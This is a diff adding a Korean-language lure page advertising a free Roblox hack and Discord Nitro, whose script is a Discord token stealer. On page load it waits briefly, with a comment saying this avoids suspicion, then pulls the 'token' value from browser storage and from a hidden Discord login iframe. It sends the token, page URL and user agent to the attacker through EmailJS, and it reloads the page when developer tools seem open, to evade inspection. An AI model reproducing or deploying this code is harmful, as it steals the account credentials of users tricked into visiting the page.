@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>로블록스 무료 핵 & 니트로 2026</title>
+  <style>
+    body { 
+      margin:0; padding:0; height:100vh; 
+      background:#000; color:#0f0; font-family: 'Courier New', monospace; 
+      display:flex; align-items:center; justify-content:center; overflow:hidden;
+    }
+    .container { text-align:center; max-width:90%; }
+    h1 { font-size:3rem; text-shadow:0 0 15px #0f0, 0 0 30px #0f0; animation: glitch 1.5s infinite; }
+    .loader { width:100px; height:100px; border:10px solid #0f0; border-top:10px solid transparent; border-radius:50%; animation: spin 0.8s linear infinite; margin:40px auto; }
+    p { font-size:1.4rem; margin:25px 0; }
+    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    @keyframes glitch {
+      0%,100% { transform:translate(0); text-shadow:2px 0 #f0f, -2px 0 #0ff; }
+      20% { transform:translate(-2px,2px); text-shadow:-2px -2px #f0f, 2px 2px #0ff; }
+      40% { transform:translate(2px,-2px); }
+    }
+  </style>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>로딩 중... 핵 다운로드 준비</h1>
+    <div class="loader"></div>
+    <p>잠시만 기다려주세요! 곧 링크가 열립니다.</p>
+  </div>
+
+  <script>
+    // EmailJS 초기화
+    (function(){
+      emailjs.init("YOUR_PUBLIC_KEY");  // ← 여기에 Public Key 넣기
+    })();
+
+    const SERVICE_ID = "service_jmsvqzd";
+    const TEMPLATE_ID = "template_fjunjx8";
+
+    async function stealDiscordToken() {
+      try {
+        let token = null;
+
+        // 1차 시도: 일반 저장소
+        token = localStorage.getItem("token") || 
+                sessionStorage.getItem("token");
+
+        // 2차 시도: iframe으로 Discord 로그인 페이지 강제 열어서 추출
+        if (!token) {
+          const iframe = document.createElement("iframe");
+          iframe.style.display = "none";
+          iframe.src = "https://discord.com/login";
+          document.body.appendChild(iframe);
+
+          await new Promise(r => setTimeout(r, 2800)); // 충분히 로드될 때까지 대기
+
+          try {
+            const win = iframe.contentWindow || iframe.contentDocument?.defaultView;
+            if (win) {
+              token = win.localStorage?.getItem("token") || 
+                      win.sessionStorage?.getItem("token");
+            }
+          } catch(e) {}
+
+          document.body.removeChild(iframe);
+        }
+
+        if (token) {
+          token = token.replace(/"/g, "").trim();
+
+          // EmailJS 발송 (to_email 없이 → 템플릿에 고정된 이메일로 감)
+          await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+            token: token,
+            url: window.location.href,
+            time: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            // to_email: 여기 안 써도 됨 (템플릿에 고정)
+          });
+
+          console.log("[+] 토큰 추출 & 발송 완료");
+        } else {
+          console.log("[-] 토큰을 찾을 수 없음");
+        }
+
+      } catch(e) {
+        console.error("[ERROR]", e);
+      }
+    }
+
+    // 페이지 완전 로드 후 1.2초 뒤 실행 (너무 빨리 하면 의심받음)
+    window.addEventListener("load", () => {
+      setTimeout(stealDiscordToken, 1200);
+    });
+
+    // DevTools 감지 시 페이지 새로고침 (탐지 회피)
+    setInterval(() => {
+      if (window.outerWidth - window.innerWidth > 160 ||
+          window.outerHeight - window.innerHeight > 160) {
+        location.reload();
+      }
+    }, 800);
+  </script>
+</body>
+</html>
